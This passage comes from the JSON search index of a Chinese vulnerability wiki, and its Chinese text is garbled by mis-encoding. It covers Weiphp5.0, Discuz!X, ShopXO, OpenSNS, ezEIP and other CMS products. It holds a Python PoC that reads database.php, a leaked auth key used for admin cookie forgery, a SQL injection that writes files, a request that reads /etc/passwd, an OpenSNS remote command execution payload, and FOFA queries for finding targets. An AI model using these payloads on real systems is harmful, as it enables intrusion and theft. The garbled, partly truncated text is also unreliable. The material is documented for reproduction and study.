$picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); ËøôÈáåÂàõÂª∫‰∫ÜÊúâÂÖ≥ÂΩìÂâçÊó∂Èó¥ÁöÑÂõæÁâáÊñá‰ª∂ÔºåÂπ∂ÂÜôÂÖ•Êñá‰ª∂Â§π/public/uploads/picture/ ‰∏ã Êàë‰ª¨ÂÖàÂ∞ùËØïÊéßÂà∂ÂèòÈáè $picUrl Êù•ÂÜôÂÖ•Êï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂Âà∞ÂõæÁâá‰∏≠ /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php Êü•ÁúãÁõÆÂΩï/public/uploads/picture/ÔºåÂπ∂Áî®ËÆ∞‰∫ãÊú¨ÊâìÂºÄÂÜôÂÖ•ÁöÑjpgÊñá‰ª∂ ÂæóÂà∞Êï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂ÁöÑ‰ø°ÊÅØÔºåÊó¢ÁÑ∂Ëøô‰∏™ÂèòÈáèÂèØÊéßÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÈÄöËøáËøô‰∏™ÊñπÊ≥ï‰∏ãËΩΩÊú®È©¨Êñá‰ª∂ÔºåÂÜçÈÄöËøáËß£ÊûêÊºèÊ¥ûÊàñËÄÖÊñá‰ª∂ÂåÖÂê´Á≠âÂÖ∂‰ªñÊºèÊ¥ûÊù•getshell Âú®ÂΩìÂâçÊù°‰ª∂‰∏ãÂπ∂‰∏çÁü•ÈÅìÊñá‰ª∂ÂêçÊòØ‰ªÄ‰πàÔºåÊâÄ‰ª•ÂõûÂà∞‰ª£Á†Å‰∏≠ÁªßÁª≠ÂØªÊâæÂèØ‰ª•Ëé∑ÂèñÊñá‰ª∂ÂêçÁöÑÂäûÊ≥ï if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } Âêë‰∏ãË∑üËøõ addFile ÂáΩÊï∞ ÂáΩÊï∞‰ΩçÁΩÆ:application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } ÂèØ‰ª•ÁúãÂà∞ËøôÈÉ®ÂàÜ‰ª£Á†ÅÂÜôÂÖ•‰∫Ü Picture Ë°®‰∏≠ $id = $this->insertGetId($data); Êàë‰ª¨Êü•Áúã‰∏Ä‰∏ãÊï∞ÊçÆÂ∫ìÁöÑËøô‰∏™Êï∞ÊçÆË°®ÔºåÂèØ‰ª•ÂèëÁé∞‰πãÂâçÊâÄ‰∏ä‰º†ÁöÑÊï∞ÊçÆÂÖ®ÈÉ®ÁºìÂ≠òÂú®Ëøô‰∏™Ë°®Èáå‰∫Ü Êàë‰ª¨Áé∞Âú®ÂàôÈúÄË¶ÅÊâæÂà∞‰∏çÈúÄË¶ÅÁôªÂΩïÁöÑÂú∞ÊñπÊù•Ëé∑ÂæóËøô‰∫õÊï∞ÊçÆÔºåÊâÄ‰ª•ÂèØ‰ª•ÂÖ®Â±ÄÂéªÊü•ÊâæË∞ÉÁî®‰∫ÜËøô‰∏™ Picture Ë°®ÁöÑÂú∞Êñπ ÊâæÂà∞‰∏ÄÂ§ÑÂèØ‰ª•Âà©Áî®ÁöÑÂú∞Êñπ function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } Ë∑üËøõ get_wpid ÂáΩÊï∞ function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } Êü•Áúã WPID ÁöÑÂÆö‰πâÔºåÊñá‰ª∂‰ΩçÁΩÆÂú®config\\weiphp_define.php ÂÆö‰πâÂÄºÈªòËÆ§‰∏∫ 1ÔºåÊâÄ‰ª•ËøôÈáåË∞ÉÁî®ÂàôÂèØ‰ª•Ëé∑ÂæóÊï∞ÊçÆÂ∫ì‰∏≠PictrueË°®ÁöÑÂÜÖÂÆπÔºåÈó¥Êé•ÁöÑÁü•ÈÅì‰∫ÜÊñá‰ª∂ÂÜÖÂÆπ‰ª•ÂèäÊñá‰ª∂Âêç ËÆøÈóÆÂú∞ÂùÄ: http://webphp/public/index.php/home/file/user_pids ÂèØ‰ª•ÁúãÂà∞Êñá‰ª∂ÂêçÔºåÊ†πÊçÆurlÂú∞ÂùÄËÆøÈóÆÈÄâÊã©‰∏ãËΩΩÂç≥ÂèØ ÊºèÊ¥ûÂà©Áî®POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') \\033[0m') print('+ \\033[34mVersion: Weiphp5.0 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\":1 } try: response = requests.post(url=upload_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäüÂ∞Ü database.phpÊñá‰ª∂ ÂÜôÂÖ•PictrueË°®‰∏≠\\033[0m\") else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥• \\033[0m\") def POC_2(target_url): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vnln_url, headers=headers).text href = re.findall(r'>> \\033[0m\")) POC_1(target_url) image_url = POC_2(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Weiphp/Weiphp5.0 ‰ªªÊÑèÁî®Êà∑Cookie‰º™ÈÄ† CNVD-2021-09693.html":{"url":"book/CMSÊºèÊ¥û/Weiphp/Weiphp5.0 ‰ªªÊÑèÁî®Êà∑Cookie‰º™ÈÄ† CNVD-2021-09693.html","title":"Weiphp5.0 ‰ªªÊÑèÁî®Êà∑Cookie‰º™ÈÄ† CNVD-2021-09693","keywords":"","body":"Weiphp5.0 ‰ªªÊÑèÁî®Êà∑Cookie‰º™ÈÄ† CNVD-2021-09693 ÊºèÊ¥ûÊèèËø∞ Weiphp5.0 Â≠òÂú®ÁÆ°ÁêÜÂëòÁî®Êà∑Cookie‰º™ÈÄ†ÔºåÈÄöËøáÊ≥ÑÈú≤ÁöÑÂØÜÈí•Êï∞ÊçÆÔºåÂèØÂà©Áî®Âä†ÂØÜÊñπÊ≥ïÊù•ÂæóÂà∞ÁÆ°ÁêÜÂëòÁöÑCookie ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Weiphp ÁéØÂ¢ÉÊê≠Âª∫ weiphp5.0ÂÆòÊñπ‰∏ãËΩΩÂèÇËÄÉÊâãÂÜå ÂèÇËÄÉÂÆòÊñπÊâãÂÜåÂàõÂª∫ÁΩëÁ´ôÂç≥ÂèØ FOFA [!NOTE] app=\"WeiPHP\" ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖàÈúÄË¶ÅÂæóÂà∞Êï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑdata_auth_keyÂØÜÈí• ÂæóÂà∞Ëøô‰∏™ÈÖçÁΩÆÊñá‰ª∂ÂèØÂèÇÁÖß‰∏ä‰∏ÄÁØáWeiphp5.0 ÂâçÂè∞Êñá‰ª∂‰ªªÊÑèËØªÂèñ 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' ÂÖ®Â±ÄÊü•Êâæ‰∏ã‰ΩøÁî®‰∫ÜËøô‰∏™ÂØÜÈí•ÁöÑÂú∞Êñπ ÊâæÂà∞‰∫ÜË∑üÊçÆËøô‰∏™ÂØÜÈí•ÁöÑÂä†ÂØÜÊñπÊ≥ïÂíåËß£ÂØÜÊñπÊ≥ï Âä†ÂØÜÊñπÊ≥ï think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i Ëß£ÂØÜÊñπÊ≥ï think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire ÂÖ®Â±ÄÊü•Áúã‰∏ã‰ΩøÁî®‰∫ÜËß£ÂØÜÊñπÊ≥ïÁöÑÂú∞Êñπ Âú®Êñá‰ª∂ application\\common.php ‰∏≠Âê´Êúâ‰ΩøÁî®Ëß£ÂØÜÊñπÊ≥ïÁöÑ‰ª£Á†ÅÔºåÁî®‰∫éÂÅöË∫´‰ªΩÈ™åËØÅ function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } Ê†πÊçÆËøôÈáåÂæóÂà∞ÁöÑ‰ª£Á†ÅÔºåÂèØ‰ª•Áü•ÈÅìÂΩìuser_Id=1Êó∂,‰ºöËß£ÂØÜÂØÜÈí•ÂêéÂà§Êñ≠ÊòØÂê¶Ê≠£Á°ÆÔºåÂ¶ÇÊûúÊ≠£Á°ÆÂàôÂèØ‰ª•ÁôªÂΩïÁ≥ªÁªü Êàë‰ª¨Âú®Êú¨Âú∞‰ΩøÁî®Âä†ÂØÜ‰ª£Á†ÅÂä†ÂØÜuser_id=1ÂæóÂà∞ÁöÑcookieÂàôÂèØ‰ª•ÁôªÂΩïÁ≥ªÁªü Ê∑ªÂä†cookie: user_id=xxxxxxxxÂç≥ÂèØÊàêÂäüÁôªÂΩï [!NOTE] Ëé∑ÂèñÂØÜÈí•ÁöÑÊñπÊ≥ïÂèÇÁÖß‰∏ä‰∏ÄÁØáÂÆ°ËÆ°ÊñáÁ´† Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Discuz!X/":{"url":"book/CMSÊºèÊ¥û/Discuz!X/","title":"Discuz!X","keywords":"","body":"Discuz!X Discuz!X Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Discuz!X/Discuz!X Â∞è‰∫é3.4 R20191201 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/Discuz!X/Discuz!X Â∞è‰∫é3.4 R20191201 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Discuz!X <3.4 R20191201 ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Discuz!X ÊºèÊ¥ûÊèèËø∞ ‰∏ç‰πÖ‰ª•ÂâçDiscuz!XÁöÑÂêéÂè∞Êä´Èú≤‰∫Ü‰∏Ä‰∏™sqlÊ≥®ÂÖ•ÁöÑÊºèÊ¥ûÔºåËøôÈáå‰πüË¶ÅÊÑüË∞¢ÊºèÊ¥ûÁöÑÂèëÁé∞ÂíåÁ†îÁ©∂ËÄÖÔºàÊó†Á≥ñÁöÑkn1f3)„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Discuz!X ÁéØÂ¢ÉÊê≠Âª∫ ÁôæÂ∫¶‰∫ëÁõò‰∏ãËΩΩÈìæÊé• ÂØÜÁ†Å: 0515 Â∞Ü uploadÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂Êã∑ÂÖ•phpstudy‰∏ãÁöÑWWWÁõÆÂΩïÊâìÂºÄÁΩëÁ´ôÊåâÁÖßÊ≠•È™§ÂÆâË£ÖÂ∞±Ë°å‰∫Ü ÊºèÊ¥ûÂ§çÁé∞ Êù•Âà∞ÂêéÂè∞È°µÈù¢, Âú® UCenter Â∫îÁî® ID ‰ΩçÁΩÆÁöÑÂèÇÊï∞Ê∑ªÂä†ÂçïÂºïÂè∑Âπ∂ÊäìÂåÖ ÂèëÁé∞Âá∫Áé∞SQLËØ≠Âè•Êä•Èîô ‰ΩøÁî®Êä•ÈîôÊ≥®ÂÖ•ÂéªËé∑ÂèñÁâàÊú¨Âè∑ ËøôÈáåÁöÑÂèÇÊï∞‰∏∫ settingnew[uc][appid] Êü•ÁúãÊñá‰ª∂ \\source\\admincp\\admincp_setting.phpÔºå Âú®2677Ë°åÊâæÂà∞‰∫ÜËæìÂÖ•ÁÇπ Ê†πÊçÆÊä•ÈîôËØ≠Âè•ÊâæÂà∞SQLËØ≠Âè•ÊâßË°åÁÇπÔºåÂú®Êñá‰ª∂uc_client\\model\\base.php ‰∏≠ÁöÑ 206Ë°å ÈÄöËøáËøôÈáåÁöÑËØ≠Âè•ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî® unionÊ≥®ÂÖ• ÁöÑÊñπÊ≥ïÊù•ÂÜôÂÖ•ÊÅ∂ÊÑèÊñá‰ª∂(secure_file_priv‰∏çËÉΩ‰∏∫Null) 1' union select \"\" into outfile 'D:/test.php';--+ ‰πüÂèØ‰ª•‰ΩøÁî®ÂÖ∂‰ªñÁöÑÊñπÊ≥ï Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ShopXO/":{"url":"book/CMSÊºèÊ¥û/ShopXO/","title":"ShopXO","keywords":"","body":"ShopXO ShopXO download ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-15822 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ShopXO/ShopXO download ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-15822.html":{"url":"book/CMSÊºèÊ¥û/ShopXO/ShopXO download ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-15822.html","title":"ShopXO download ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-15822","keywords":"","body":"ShopXO download ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û CNVD-2021-15822 ÊºèÊ¥ûÊèèËø∞ ShopXOÊòØ‰∏ÄÂ•óÂºÄÊ∫êÁöÑ‰ºÅ‰∏öÁ∫ßÂºÄÊ∫êÁîµÂ≠êÂïÜÂä°Á≥ªÁªü„ÄÇShopXOÂ≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ShopXO FOFA [!NOTE] app=\"ShopXO‰ºÅ‰∏öÁ∫ßB2CÁîµÂïÜÁ≥ªÁªüÊèê‰æõÂïÜ\" ÊºèÊ¥ûÂ§çÁé∞ ÂïÜÂüé‰∏ªÈ°µÂ¶Ç‰∏ã ÂèëÈÄÅÊºèÊ¥ûËØ∑Ê±ÇÂåÖ GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ÂÖ∂‰∏≠ /url/xxxx ‰∏≠ÁöÑ base64 Ëß£Á†ÅÂêé‰∏∫ /etc/passwd Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/OpenSNS/":{"url":"book/CMSÊºèÊ¥û/OpenSNS/","title":"OpenSNS","keywords":"","body":"OpenSNS OpenSNS shareBox ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/OpenSNS/OpenSNS shareBox ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/OpenSNS/OpenSNS shareBox ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"OpenSNS shareBox ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"OpenSNS shareBox ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ OpenSNS Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèëÈÄÅÁâπÂÆöÁöÑËØ∑Ê±ÇÂåÖÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] OpenSNS FOFA [!NOTE] icon_hash=\"1167011145\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅPayload /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Typesetter/":{"url":"book/CMSÊºèÊ¥û/Typesetter/","title":"Typesetter","keywords":"","body":"Typesetter Typesetter CMS 5-5.1 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/Typesetter/Typesetter CMS 5-5.1 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/CMSÊºèÊ¥û/Typesetter/Typesetter CMS 5-5.1 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html","title":"Typesetter CMS 5-5.1 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","keywords":"","body":"Typesetter CMS 5-5.1 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÊèèËø∞ ÂèØ‰ª•ÈÄöËøáÂ∞Ü.phpÊîæÂú®.zipÊñá‰ª∂‰∏≠Âπ∂Ëß£ÂéãÁº©Êù•ÁªïËøáÂØπ.phpÊñá‰ª∂ÁöÑ‰øùÊä§„ÄÇ‰∏ÄÊó¶ÂÆåÊàêÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî®ÊÅ∂ÊÑèÁöÑphpÊñá‰ª∂ÔºàwebshellÔºâÂú®ËÆ°ÁÆóÊú∫‰∏äÊâßË°åÂëΩ‰ª§ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Typesetter CMS 5-5.1 ÊºèÊ¥ûÂ§çÁé∞ ÊåâÂ¶Ç‰∏ãÊ≠•È™§Â§çÁé∞ ÂèÇËÄÉÊñáÁ´† Github ÁªïËøáÊñá‰ª∂‰∏ä‰º†ÈôêÂà∂ÂØºËá¥ÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/YzmCMS/":{"url":"book/CMSÊºèÊ¥û/YzmCMS/","title":"YzmCMS","keywords":"","body":"YzmCMS YzmCMS Version Â∞è‰∫éV5.8Ê≠£ÂºèÁâà ÂêéÂè∞ÈááÈõÜÊ®°Âùó SSRFÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/YzmCMS/YzmCMS Version  Â∞è‰∫éV5.8Ê≠£ÂºèÁâà ÂêéÂè∞ÈááÈõÜÊ®°Âùó SSRFÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/YzmCMS/YzmCMS Version  Â∞è‰∫éV5.8Ê≠£ÂºèÁâà ÂêéÂè∞ÈááÈõÜÊ®°Âùó SSRFÊºèÊ¥û.html","title":"YzmCMS Version  Â∞è‰∫éV5.8Ê≠£ÂºèÁâà ÂêéÂè∞ÈááÈõÜÊ®°Âùó SSRFÊºèÊ¥û","keywords":"","body":"YzmCMS version ÊºèÊ¥ûÊèèËø∞ YzmCMSÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÊòØ‰∏ÄÊ¨æËΩªÈáèÁ∫ßÂºÄÊ∫êÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÆÉÈááÁî®Ëá™‰∏ªÁ†îÂèëÁöÑÊ°ÜÊû∂YZMPHPÂºÄÂèë„ÄÇÁ®ãÂ∫èÂü∫‰∫éPHP+MysqlÊû∂ÊûÑÔºåÂπ∂ÈááÁî®MVCÊ°ÜÊû∂ÂºèÂºÄÂèëÁöÑ‰∏ÄÊ¨æÈ´òÊïàÂºÄÊ∫êÁöÑÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåÂèØËøêË°åÂú®Linux„ÄÅWindows„ÄÅMacOSX„ÄÅSolarisÁ≠âÂêÑÁßçÂπ≥Âè∞‰∏ä„ÄÇ Ê∫êÁ†ÅÂ≠òÂú®ÂçèËÆÆËØÜÂà´ÁöÑÁº∫Èô∑ÔºåÂØºËá¥Â≠òÂú®SSRFÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] YzmCMS version ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/yzmcms/yzmcms ÊåâÁÖßÊñáÊ°£ÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞ --> Ê®°ÂùóÁÆ°ÁêÜ --> ÈááÈõÜÁÆ°ÁêÜ Ê∑ªÂä†ÈááÈõÜËßÑÂàô Âú®‰Ω†ÁöÑÊúçÂä°Âô®‰∏äÁºñËæëHTML‰ª£Á†Å [!NOTE] Ê†πÁõÆÂΩïÂèØËÉΩ‰∏çÂêåÔºåpayloadÈúÄË¶ÅÊõ¥Êîπ ÁÇπÂáªÈááÈõÜËØªÂèñÊ†πÁõÆÂΩï‰∏ãÁöÑ Flag Âá∫Áé∞ÊºèÊ¥ûÁöÑ‰ª£Á†Å‰ΩçÁΩÆ yzmcms/yzmphp/core/class/cache_factory.class.php ËøôÈáåË∞ÉÁî® url_check ÂáΩÊï∞ ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂè™Ê£ÄÊµã‰∫ÜÂâç4‰ΩçÊòØÂê¶‰∏∫ httpÔºå‰ΩøÁî® httpxxx Âç≥ÂèØÁªïËøá ÂèÇËÄÉÊñáÁ´† There are SSRF vulnerabilities in background collection management Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ezEIP/":{"url":"book/CMSÊºèÊ¥û/ezEIP/","title":"ezEIP","keywords":"","body":"ezEIP ezEIP 4.1.0 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ezEIP/ezEIP 4.1.0 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/ezEIP/ezEIP 4.1.0 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"ezEIP 4.1.0 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"ezEIP 4.1.0 ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ezEIP 4.1.0 Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÈÄöËøáÈÅçÂéÜCookie‰∏≠ÁöÑÂèÇÊï∞ÂÄºËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ezEIP 4.1.0 FOFA [!NOTE] \"ezEIP\" ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûUrl‰∏∫ /label/member/getinfo.aspx ËÆøÈóÆÊó∂Ê∑ªÂä†CookieÔºàÈÄöËøáÈÅçÂéÜËé∑ÂèñÁî®Êà∑ÁöÑÁôªÂΩïÂêçÁîµËØùÈÇÆÁÆ±Á≠â‰ø°ÊÅØÔºâ WHIR_USERINFOR=whir_mem_member_pid=1; Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/OKLite/":{"url":"book/CMSÊºèÊ¥û/OKLite/","title":"OKLite","keywords":"","body":"OKLite OKLite 1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ• ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CVE-2019-16131 OKLite 1.2.25 ÂêéÂè∞Êèí‰ª∂ÂÆâË£Ö ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† OKLite 1.2.25 ÂêéÂè∞È£éÊ†ºÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ CVE-2019-16132 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/OKLite/OKLite 1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ• ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CVE-2019-16131.html":{"url":"book/CMSÊºèÊ¥û/OKLite/OKLite 1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ• 